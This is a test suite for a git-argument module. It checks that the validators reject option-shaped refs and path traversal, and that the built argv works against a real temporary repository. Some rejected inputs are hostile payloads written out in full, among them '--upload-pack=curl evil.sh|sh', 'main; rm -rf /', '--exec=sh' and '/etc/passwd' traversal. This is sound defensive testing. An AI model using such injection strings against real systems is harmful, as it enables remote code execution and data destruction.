/**
 * Coverage for server/routes/git-args.js.
 *
 * Two layers, because each catches a different class of mistake:
 *
 *   Unit tests pin the validators and the exact argv each builder produces.
 *   They catch "someone loosened a regex" and "someone moved the separator".
 *
 *   Integration tests run that same argv against a real repository (with a
 *   real bare remote for the network commands). They catch the mistake the
 *   unit tests structurally cannot: an argv that is well-formed and passes
 *   every static check but means something different to git than intended.
 *   This suite exists because `['checkout', '--', branch]` looked correct in
 *   review, type-checked, linted clean — and silently stopped switching
 *   branches, because for `checkout` the `--` separator selects the *path*
 *   interpretation of the operand.
 *
 * The integration half is skipped when git is unavailable rather than failing,
 * so the unit half still runs in a minimal container.
 */
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';

import { afterAll, beforeAll, describe, test } from 'vitest';

import {
  checkoutBranchArgs,
  createBranchArgs,
  deleteBranchArgs,
  fetchArgs,
  pullArgs,
  pushArgs,
  pushSetUpstreamArgs,
  rejectLeadingDash,
  showCommitArgs,
  validateBranchName,
  validateCommitRef,
  validateFilePath,
  validateProjectPath,
  validateRemoteName,
} from '../git-args.js';

/* ---------------------------------------------------------------- validators */

test('rejectLeadingDash blocks option-shaped values and passes everything else', () => {
  assert.equal(rejectLeadingDash('main', 'branch name'), 'main');
  assert.equal(rejectLeadingDash('a-b', 'branch name'), 'a-b', 'inner dashes are fine');
  assert.throws(() => rejectLeadingDash('-D', 'branch name'), /must not start with "-"/);
  assert.throws(() => rejectLeadingDash('--upload-pack=x', 'remote name'), /remote name/);
});

test('validateCommitRef accepts real revision syntax', () => {
  for (const ref of [
    'HEAD',
    'HEAD~3',
    'HEAD^',
    'HEAD^{tree}',
    'a1b2c3d',
    '0d7f6ae9c4b1e8f2a3d5c6b7e8f9a0b1c2d3e4f5',
    'v1.2.3',
    'feature/nested-branch',
    'origin/main',
    'main@{upstream}',
  ]) {
    assert.equal(validateCommitRef(ref), ref, `${ref} should be accepted`);
  }
});

test('validateCommitRef rejects option-shaped and out-of-charset refs', () => {
  // The first two are the argument-injection payloads that motivated the check.
  assert.throws(() => validateCommitRef('--upload-pack=curl evil.sh|sh'), /Invalid commit reference/);
  assert.throws(() => validateCommitRef('-n1'), /must not start with "-"/);
  assert.throws(() => validateCommitRef('main; rm -rf /'), /Invalid commit reference/);
  assert.throws(() => validateCommitRef('main branch'), /Invalid commit reference/);
  assert.throws(() => validateCommitRef('ref\0null'), /Invalid commit reference/);
  assert.throws(() => validateCommitRef(''), /Invalid commit reference/);
});

test('validateBranchName accepts ordinary names and rejects dangerous ones', () => {
  for (const name of ['main', 'feature/login', 'release-1.2', 'a_b.c']) {
    assert.equal(validateBranchName(name), name);
  }

  assert.throws(() => validateBranchName('-D'), /must not start with "-"/);
  assert.throws(() => validateBranchName('--force'), /must not start with "-"/);
  assert.throws(() => validateBranchName('has space'), /Invalid branch name/);
  assert.throws(() => validateBranchName('has~tilde'), /Invalid branch name/);
  assert.throws(() => validateBranchName(''), /Invalid branch name/);
});

test('validateRemoteName is stricter than branch names (no slashes)', () => {
  assert.equal(validateRemoteName('origin'), 'origin');
  assert.equal(validateRemoteName('up-stream.2'), 'up-stream.2');

  // A slash would let a "remote" address a path-ish target.
  assert.throws(() => validateRemoteName('origin/main'), /Invalid remote name/);
  assert.throws(() => validateRemoteName('--exec=sh'), /Invalid remote name/);
  assert.throws(() => validateRemoteName('-u'), /must not start with "-"/);
});

test('validateFilePath blocks traversal outside the project root', () => {
  const root = '/tmp/project';

  assert.equal(validateFilePath('src/index.ts', root), 'src/index.ts');
  assert.equal(validateFilePath('.', root), '.', 'the root itself is in bounds');
  assert.equal(validateFilePath('a/../b.ts', root), 'a/../b.ts', 'traversal that stays inside is fine');

  assert.throws(() => validateFilePath('../outside.ts', root), /path traversal/);
  assert.throws(() => validateFilePath('src/../../etc/passwd', root), /path traversal/);
  assert.throws(() => validateFilePath('/etc/passwd', root), /path traversal/);
  assert.throws(() => validateFilePath('with\0null', root), /Invalid file path/);
  assert.throws(() => validateFilePath('', root), /Invalid file path/);

  // A sibling directory sharing the root's prefix must not pass the check.
  assert.throws(() => validateFilePath('../project-evil/x.ts', root), /path traversal/);
});

test('validateProjectPath requires an absolute, non-root path', () => {
  assert.equal(validateProjectPath('/home/user/app'), '/home/user/app');
  assert.equal(validateProjectPath('/home/user/app/'), '/home/user/app', 'trailing slash normalized');

  assert.throws(() => validateProjectPath('/'), /root directory not allowed/);
  assert.throws(() => validateProjectPath(''), /Invalid project path/);
  assert.throws(() => validateProjectPath(null), /Invalid project path/);
  assert.throws(() => validateProjectPath('/etc/\0'), /Invalid project path/);
});

/* ------------------------------------------------------------------ builders */

test('builders produce the exact argv, separators included', () => {
  // These assertions are deliberately literal. If someone "normalizes" the
  // separator placement across builders, this fails before the integration
  // test does, and points at the specific command that changed.
  assert.deepEqual(checkoutBranchArgs('feature'), ['checkout', 'feature']);
  assert.deepEqual(createBranchArgs('feature'), ['checkout', '-b', 'feature', '--']);
  assert.deepEqual(deleteBranchArgs('feature'), ['branch', '-d', '--', 'feature']);
  assert.deepEqual(showCommitArgs('HEAD'), ['show', 'HEAD', '--']);
  assert.deepEqual(fetchArgs('origin'), ['fetch', '--', 'origin']);
  assert.deepEqual(pullArgs('origin', 'main'), ['pull', '--', 'origin', 'main']);
  assert.deepEqual(pushArgs('origin', 'main'), ['push', '--', 'origin', 'main']);
  assert.deepEqual(pushSetUpstreamArgs('origin', 'main'), [
    'push',
    '--set-upstream',
    '--',
    'origin',
    'main',
  ]);
});

test('checkoutBranchArgs must NOT contain a separator', () => {
  // Guarding this explicitly, with the reason attached, because the "obvious"
  // hardening here is wrong: `git checkout -- feature` restores a *file* named
  // feature and leaves the branch untouched. See the integration test below.
  assert.equal(
    checkoutBranchArgs('feature').includes('--'),
    false,
    '`--` makes git checkout treat the operand as a pathspec, breaking branch switching',
  );
});

test('every builder validates before returning', () => {
  assert.throws(() => checkoutBranchArgs('-D'), /must not start with "-"/);
  assert.throws(() => createBranchArgs('--force'), /must not start with "-"/);
  assert.throws(() => deleteBranchArgs('-D'), /must not start with "-"/);
  assert.throws(() => showCommitArgs('--upload-pack=x'), /Invalid commit reference/);
  assert.throws(() => fetchArgs('--upload-pack=x'), /Invalid remote name/);
  assert.throws(() => pullArgs('-u', 'main'), /must not start with "-"/);
  assert.throws(() => pullArgs('origin', '--force'), /must not start with "-"/);
  assert.throws(() => pushArgs('origin', '--delete'), /must not start with "-"/);
  assert.throws(() => pushSetUpstreamArgs('origin', '-D'), /must not start with "-"/);
});

/* --------------------------------------------------------------- integration */

const gitAvailable = (() => {
  try {
    return spawnSync('git', ['--version'], { encoding: 'utf8' }).status === 0;
  } catch {
    return false;
  }
})();

describe.skipIf(!gitAvailable)('built argv against a real repository', () => {
  let workspace;
  let repo;
  let remote;

  /** Runs git with argv exactly as spawnAsync would, minus the promise. */
  const git = (args, cwd = repo) => {
    const result = spawnSync('git', args, { cwd, encoding: 'utf8' });
    return {
      status: result.status,
      stdout: result.stdout ?? '',
      stderr: result.stderr ?? '',
    };
  };

  const currentBranch = (cwd = repo) => git(['rev-parse', '--abbrev-ref', 'HEAD'], cwd).stdout.trim();

  beforeAll(() => {
    workspace = fs.mkdtempSync(path.join(os.tmpdir(), 'prism-git-args-'));
    repo = path.join(workspace, 'repo');
    remote = path.join(workspace, 'remote.git');

    fs.mkdirSync(repo);
    spawnSync('git', ['init', '--initial-branch=main', remote, '--bare'], { encoding: 'utf8' });

    for (const args of [
      ['init', '--initial-branch=main'],
      ['config', 'user.email', 'test@prism.local'],
      ['config', 'user.name', 'Prism Test'],
      // Keep the sandbox hermetic: no global hooks, no signing prompts.
      ['config', 'commit.gpgsign', 'false'],
      ['remote', 'add', 'origin', remote],
    ]) {
      git(args);
    }

    fs.writeFileSync(path.join(repo, 'README.md'), '# fixture\n');
    git(['add', '.']);
    git(['commit', '-m', 'initial commit']);
  });

  afterAll(() => {
    if (workspace) fs.rmSync(workspace, { recursive: true, force: true });
  });

  test('createBranchArgs creates the branch and switches to it', () => {
    const result = git(createBranchArgs('feature/one'));

    assert.equal(result.status, 0, result.stderr);
    assert.equal(currentBranch(), 'feature/one');
  });

  test('checkoutBranchArgs actually switches branches', () => {
    // THE regression test. With `['checkout', '--', 'main']` this call exits
    // non-zero with "pathspec 'main' did not match any file(s) known to git"
    // and leaves HEAD on feature/one — a silently broken branch switcher.
    git(createBranchArgs('feature/two'));
    assert.equal(currentBranch(), 'feature/two');

    const result = git(checkoutBranchArgs('main'));

    assert.equal(result.status, 0, `checkout should succeed, got: ${result.stderr}`);
    assert.equal(currentBranch(), 'main', 'HEAD must have moved to the requested branch');
  });

  test('the tempting `checkout --` form is proven broken, not just assumed', () => {
    // Pinning the actual git behavior that makes checkoutBranchArgs special.
    // If a future git ever changes this, this test tells us the constraint
    // has lifted, rather than leaving a stale comment behind.
    git(checkoutBranchArgs('main'));
    const broken = git(['checkout', '--', 'feature/one']);

    assert.notEqual(broken.status, 0, 'git checkout -- <branch> is expected to fail');
    assert.match(broken.stderr, /pathspec/i);
    assert.equal(currentBranch(), 'main', 'and it does not switch branches');
  });

  test('deleteBranchArgs removes a merged branch', () => {
    git(checkoutBranchArgs('main'));
    git(createBranchArgs('feature/disposable'));
    git(checkoutBranchArgs('main'));

    const result = git(deleteBranchArgs('feature/disposable'));

    assert.equal(result.status, 0, result.stderr);
    assert.doesNotMatch(git(['branch', '--list']).stdout, /feature\/disposable/);
  });

  test('showCommitArgs prints the commit and its diff', () => {
    const result = git(showCommitArgs('HEAD'));

    assert.equal(result.status, 0, result.stderr);
    assert.match(result.stdout, /initial commit/);
    assert.match(result.stdout, /README\.md/, 'the diff body should be included');
  });

  test('showCommitArgs works for a ref that shares a name with a file', () => {
    // The trailing `--` earns its place here: without it, git would complain
    // that "README.md" is ambiguous between a revision and a path.
    git(checkoutBranchArgs('main'));
    git(createBranchArgs('README.md-ish'));
    git(checkoutBranchArgs('main'));

    const result = git(showCommitArgs('README.md-ish'));
    assert.equal(result.status, 0, result.stderr);
  });

  test('pushSetUpstreamArgs publishes the branch and sets tracking', () => {
    git(checkoutBranchArgs('main'));
    const result = git(pushSetUpstreamArgs('origin', 'main'));

    assert.equal(result.status, 0, result.stderr);
    assert.equal(
      git(['rev-parse', '--abbrev-ref', 'main@{upstream}']).stdout.trim(),
      'origin/main',
      'upstream tracking must be configured',
    );
  });

  test('fetchArgs, pullArgs and pushArgs round-trip against the remote', () => {
    git(checkoutBranchArgs('main'));
    git(pushSetUpstreamArgs('origin', 'main'));

    assert.equal(git(fetchArgs('origin')).status, 0, 'fetch');

    fs.writeFileSync(path.join(repo, 'second.txt'), 'more\n');
    git(['add', '.']);
    git(['commit', '-m', 'second commit']);

    assert.equal(git(pushArgs('origin', 'main')).status, 0, 'push');

    // Clone the remote to prove the push landed and that pull sees it.
    const consumer = path.join(workspace, 'consumer');
    assert.equal(spawnSync('git', ['clone', remote, consumer], { encoding: 'utf8' }).status, 0);
    for (const args of [
      ['config', 'user.email', 'test@prism.local'],
      ['config', 'user.name', 'Prism Test'],
    ]) {
      git(args, consumer);
    }

    assert.match(git(['log', '--oneline'], consumer).stdout, /second commit/);

    fs.writeFileSync(path.join(repo, 'third.txt'), 'even more\n');
    git(['add', '.']);
    git(['commit', '-m', 'third commit']);
    git(pushArgs('origin', 'main'));

    const pulled = git(pullArgs('origin', 'main'), consumer);
    assert.equal(pulled.status, 0, pulled.stderr);
    assert.match(git(['log', '--oneline'], consumer).stdout, /third commit/);
  });

  test('an option-shaped branch never reaches git', () => {
    // End-to-end proof of the validator layer: the throw happens before any
    // process is spawned, so `git branch -D` is never executed.
    assert.throws(() => git(deleteBranchArgs('-D')), /must not start with "-"/);
    assert.equal(currentBranch(), 'main');
  });
});
